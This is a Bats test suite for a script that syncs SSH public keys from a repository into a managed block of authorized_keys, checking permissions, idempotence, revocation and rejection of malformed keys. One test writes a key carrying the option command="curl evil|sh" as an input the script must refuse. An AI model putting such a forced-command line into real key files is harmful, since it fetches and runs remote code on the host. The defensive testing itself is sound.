#!/usr/bin/env bats

setup() {
  SCRIPT="${BATS_TEST_DIRNAME}/../scripts/fleet-authorize.sh"
  REPO="${BATS_TEST_TMPDIR}/repo"
  AK="${BATS_TEST_TMPDIR}/home/.ssh/authorized_keys"
  mkdir -p "$REPO/ssh/keys"
  KEY_A='ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA alice@studio'
  KEY_B='ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB alice@laptop'
  OWN='ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCown hand-added'
}

@test "creates authorized_keys with a managed block and private modes" {
  printf '%s\n' "$KEY_A" > "$REPO/ssh/keys/studio.pub"
  run "$SCRIPT" "$REPO" "$AK"
  [ "$status" -eq 0 ]
  grep -qxF "$KEY_A" "$AK"
  [ "$(stat -f %Lp "$AK" 2>/dev/null || stat -c %a "$AK")" = 600 ]
  [ "$(stat -f %Lp "$(dirname "$AK")" 2>/dev/null || stat -c %a "$(dirname "$AK")")" = 700 ]
}

@test "preserves keys outside the block and is idempotent" {
  mkdir -p "$(dirname "$AK")"
  printf '%s\n' "$OWN" > "$AK"
  printf '%s\n' "$KEY_A" > "$REPO/ssh/keys/studio.pub"
  "$SCRIPT" "$REPO" "$AK"
  first="$(cat "$AK")"
  "$SCRIPT" "$REPO" "$AK"
  [ "$(cat "$AK")" = "$first" ]
  grep -qxF "$OWN" "$AK"
  [ "$(grep -cxF "$KEY_A" "$AK")" -eq 1 ]
}

@test "a key removed from the repo is revoked; an empty directory removes the block" {
  printf '%s\n' "$KEY_A" > "$REPO/ssh/keys/studio.pub"
  printf '%s\n' "$KEY_B" > "$REPO/ssh/keys/laptop.pub"
  "$SCRIPT" "$REPO" "$AK"
  rm "$REPO/ssh/keys/laptop.pub"
  "$SCRIPT" "$REPO" "$AK"
  grep -qxF "$KEY_A" "$AK"
  ! grep -qF "$KEY_B" "$AK"
  rm "$REPO/ssh/keys/studio.pub"
  printf '%s\n' "$OWN" >> "$AK"
  "$SCRIPT" "$REPO" "$AK"
  ! grep -q 'harness:fleet' "$AK"
  grep -qxF "$OWN" "$AK"
}

@test "rejects option-bearing and multi-line key files without writing" {
  mkdir -p "$(dirname "$AK")"
  printf '%s\n' "$OWN" > "$AK"
  printf 'command="curl evil|sh" %s\n' "$KEY_A" > "$REPO/ssh/keys/bad.pub"
  run "$SCRIPT" "$REPO" "$AK"
  [ "$status" -eq 1 ]
  [ "$(cat "$AK")" = "$OWN" ]
  printf '%s\n%s\n' "$KEY_A" "$KEY_B" > "$REPO/ssh/keys/bad.pub"
  run "$SCRIPT" "$REPO" "$AK"
  [ "$status" -eq 1 ]
  [ "$(cat "$AK")" = "$OWN" ]
}

@test "unpaired marker aborts instead of dropping later keys" {
  mkdir -p "$(dirname "$AK")"
  printf '%s\n%s\n' '# harness:fleet start — managed by fleet-authorize.sh; edits inside are overwritten' "$OWN" > "$AK"
  before="$(cat "$AK")"
  printf '%s\n' "$KEY_A" > "$REPO/ssh/keys/studio.pub"
  run "$SCRIPT" "$REPO" "$AK"
  [ "$status" -eq 1 ]
  [ "$(cat "$AK")" = "$before" ]
}

@test "missing key directory exits 2" {
  run "$SCRIPT" "${BATS_TEST_TMPDIR}/nowhere" "$AK"
  [ "$status" -eq 2 ]
  [ ! -e "$AK" ]
}
